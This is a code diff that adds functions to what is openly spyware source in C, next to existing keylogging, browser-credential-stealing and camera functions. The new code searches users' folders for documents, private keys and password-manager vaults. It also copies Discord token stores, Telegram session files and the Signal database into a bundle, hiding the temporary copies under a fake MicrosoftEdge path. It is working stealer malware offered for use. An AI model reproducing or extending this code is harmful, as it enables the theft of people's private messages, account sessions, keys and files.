@@ -643,6 +643,244 @@ char *spy_camera_snapshot(int *len_out)
     return mf_camera_snapshot(len_out);
 }
 
+/* ── File index ──────────────────────────────────────────────────────────
+ *
+ * Recursively walks C:\Users\ and appends the full path of any file whose
+ * extension matches the sensitive-document list.  Returns a newline-
+ * separated text buffer; depth is capped at 10 to guard against junction
+ * or symlink cycles. */
+
+static const char *g_search_exts[] = {
+    /* Documents */
+    ".docx", ".pdf", ".xlsx", ".pptx", ".txt", ".rtf", ".odt", ".csv",
+    /* Keys & certificates */
+    ".pem", ".key", ".p12", ".pfx", ".ppk",
+    /* Archives */
+    ".zip", ".7z", ".rar",
+    /* Databases */
+    ".sqlite", ".db",
+    /* Password managers */
+    ".kdbx", ".1pux", ".psafe3",
+    NULL
+};
+
+/* Directories that produce enormous, worthless hits — skip them outright. */
+static int should_skip_dir(const char *name)
+{
+    static const char *skip[] = {
+        "Temp", "temp", "Cache", "cache", "Caches",
+        "Local Settings", "Temporary Internet Files",
+        "$Recycle.Bin", "Windows", NULL
+    };
+    for (int i = 0; skip[i]; i++)
+        if (_stricmp(name, skip[i]) == 0) return 1;
+    return 0;
+}
+
+static void file_search_recurse(const char *dir,
+                                 char **buf, int *len, int *cap, int depth)
+{
+    if (depth > 10) return;
+
+    char pattern[MAX_PATH];
+    _snprintf(pattern, sizeof(pattern), "%s\\*", dir);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (fd.cFileName[0] == '.') continue;
+
+        char full[MAX_PATH];
+        _snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);
+
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            if (!should_skip_dir(fd.cFileName))
+                file_search_recurse(full, buf, len, cap, depth + 1);
+            continue;
+        }
+
+        const char *dot = strrchr(fd.cFileName, '.');
+        if (!dot) continue;
+        int matched = 0;
+        for (int i = 0; g_search_exts[i]; i++) {
+            if (_stricmp(dot, g_search_exts[i]) == 0) { matched = 1; break; }
+        }
+        if (!matched) continue;
+
+        int plen = (int)strlen(full);
+        int needed = plen + 1; /* +1 for newline */
+        if (*len + needed + 1 > *cap) {
+            int new_cap = *len + needed + 8192;
+            char *nb = realloc(*buf, new_cap);
+            if (!nb) { FindClose(hFind); return; }
+            *buf = nb;
+            *cap = new_cap;
+        }
+        memcpy(*buf + *len, full, plen);
+        (*buf)[*len + plen] = '\n';
+        *len += needed;
+
+    } while (FindNextFileA(hFind, &fd));
+
+    FindClose(hFind);
+}
+
+char *spy_file_search(int *len_out)
+{
+    int cap = 8192;
+    char *buf = malloc(cap);
+    if (!buf) return NULL;
+    int len = 0;
+
+    file_search_recurse("C:\\Users", &buf, &len, &cap, 0);
+
+    if (len == 0) { free(buf); return NULL; }
+    buf[len] = '\0';
+    *len_out = len;
+    return buf;
+}
+
+/* ── Messaging exfiltration ──────────────────────────────────────────────
+ *
+ * Targets Discord (LevelDB *.ldb/*.log), Telegram Desktop (tdata\ files),
+ * and Signal (sql\db.sqlite + config.json).  Uses CopyFileA to read files
+ * that are open/locked while the app is running, then bundles into:
+ *
+ *   [4b num_entries]
+ *   per entry: [4b path_len][display_path][4b data_len][data]
+ *
+ * The display_path encodes the app, e.g. "Discord\abc.ldb". */
+
+static int bundle_via_copy(char **buf, int *len, int *cap,
+                            const char *display_path, const char *src_path,
+                            int tmp_idx)
+{
+    /* Size guard: skip files larger than 100 MB */
+    WIN32_FILE_ATTRIBUTE_DATA fa;
+    if (!GetFileAttributesExA(src_path, GetFileExInfoStandard, &fa)) return 0;
+    if (fa.nFileSizeHigh > 0 || fa.nFileSizeLow > 100 * 1024 * 1024) return 0;
+
+    char tmp[MAX_PATH];
+    _snprintf(tmp, sizeof(tmp),
+              "C:\\Users\\Public\\MicrosoftEdge\\ms_%d.tmp", tmp_idx);
+    if (!CopyFileA(src_path, tmp, FALSE)) return 0;
+
+    int file_len = 0;
+    char *file_data = read_file_heap_plain(tmp, &file_len);
+    DeleteFileA(tmp);
+    if (!file_data) return 0;
+
+    int plen   = (int)strlen(display_path);
+    int needed = 4 + plen + 4 + file_len;
+    if (*len + needed > *cap) {
+        int new_cap = *len + needed + 65536;
+        char *nb = realloc(*buf, new_cap);
+        if (!nb) { free(file_data); return 0; }
+        *buf = nb;
+        *cap = new_cap;
+    }
+
+    char *p = *buf + *len;
+    memcpy(p, &plen,        4);    p += 4;
+    memcpy(p, display_path, plen); p += plen;
+    memcpy(p, &file_len,    4);    p += 4;
+    memcpy(p, file_data,    file_len);
+    *len += needed;
+    free(file_data);
+    return 1;
+}
+
+char *spy_messaging_steal(int *len_out)
+{
+    char appdata[MAX_PATH];
+    if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) return NULL;
+
+    int cap = 65536;
+    char *buf = malloc(cap);
+    if (!buf) return NULL;
+    int len = 4; /* reserve space for [4b num_entries] */
+    int num_entries = 0;
+    int tmp_idx = 0;
+
+    /* ── Discord: LevelDB *.ldb and *.log files ─────────────────────── */
+    {
+        char ldb_dir[MAX_PATH];
+        _snprintf(ldb_dir, sizeof(ldb_dir),
+                  "%s\\discord\\Local Storage\\leveldb", appdata);
+        char pattern[MAX_PATH];
+        _snprintf(pattern, sizeof(pattern), "%s\\*", ldb_dir);
+
+        WIN32_FIND_DATAA fd;
+        HANDLE hf = FindFirstFileA(pattern, &fd);
+        if (hf != INVALID_HANDLE_VALUE) {
+            do {
+                if (fd.cFileName[0] == '.') continue;
+                const char *dot = strrchr(fd.cFileName, '.');
+                if (!dot) continue;
+                if (_stricmp(dot, ".ldb") != 0 && _stricmp(dot, ".log") != 0)
+                    continue;
+                char src[MAX_PATH], disp[MAX_PATH];
+                _snprintf(src,  sizeof(src),  "%s\\%s", ldb_dir, fd.cFileName);
+                _snprintf(disp, sizeof(disp), "Discord\\%s", fd.cFileName);
+                num_entries += bundle_via_copy(&buf, &len, &cap,
+                                               disp, src, tmp_idx++);
+            } while (FindNextFileA(hf, &fd));
+            FindClose(hf);
+        }
+    }
+
+    /* ── Telegram Desktop: all direct-child files in tdata\ ─────────── */
+    {
+        char tdata[MAX_PATH];
+        _snprintf(tdata, sizeof(tdata),
+                  "%s\\Telegram Desktop\\tdata", appdata);
+        char pattern[MAX_PATH];
+        _snprintf(pattern, sizeof(pattern), "%s\\*", tdata);
+
+        WIN32_FIND_DATAA fd;
+        HANDLE hf = FindFirstFileA(pattern, &fd);
+        if (hf != INVALID_HANDLE_VALUE) {
+            do {
+                if (fd.cFileName[0] == '.') continue;
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+                /* Skip files larger than 5 MB at the FindData level */
+                if (fd.nFileSizeHigh > 0 || fd.nFileSizeLow > 5 * 1024 * 1024)
+                    continue;
+                char src[MAX_PATH], disp[MAX_PATH];
+                _snprintf(src,  sizeof(src),  "%s\\%s", tdata, fd.cFileName);
+                _snprintf(disp, sizeof(disp), "Telegram\\%s", fd.cFileName);
+                num_entries += bundle_via_copy(&buf, &len, &cap,
+                                               disp, src, tmp_idx++);
+            } while (FindNextFileA(hf, &fd));
+            FindClose(hf);
+        }
+    }
+
+    /* ── Signal: encrypted SQLite database + config ──────────────────── */
+    {
+        static const char *sig_files[][2] = {
+            { "sql\\db.sqlite", "Signal\\db.sqlite"   },
+            { "config.json",    "Signal\\config.json"  },
+            { NULL, NULL }
+        };
+        char sig_dir[MAX_PATH];
+        _snprintf(sig_dir, sizeof(sig_dir), "%s\\Signal", appdata);
+        for (int i = 0; sig_files[i][0]; i++) {
+            char src[MAX_PATH];
+            _snprintf(src, sizeof(src), "%s\\%s", sig_dir, sig_files[i][0]);
+            num_entries += bundle_via_copy(&buf, &len, &cap,
+                                           sig_files[i][1], src, tmp_idx++);
+        }
+    }
+
+    memcpy(buf, &num_entries, 4);
+    if (num_entries == 0) { free(buf); return NULL; }
+    *len_out = len;
+    return buf;
+}
+
 #else
 /* Stub implementations for non-Windows platforms */
 void spy_keylog_start(void) {}
@@ -654,4 +892,6 @@ char *spy_browser_creds_steal(int *len_out) { *len_out = 0; return NULL; }
 char *spy_browser_history_steal(int *len_out) { *len_out = 0; return NULL; }
 char *spy_camera_snapshot(int *len_out) { *len_out = 0; return NULL; }
 const char *spy_camera_last_error(void) { return ""; }
+char *spy_file_search(int *len_out) { *len_out = 0; return NULL; }
+char *spy_messaging_steal(int *len_out) { *len_out = 0; return NULL; }
 #endif
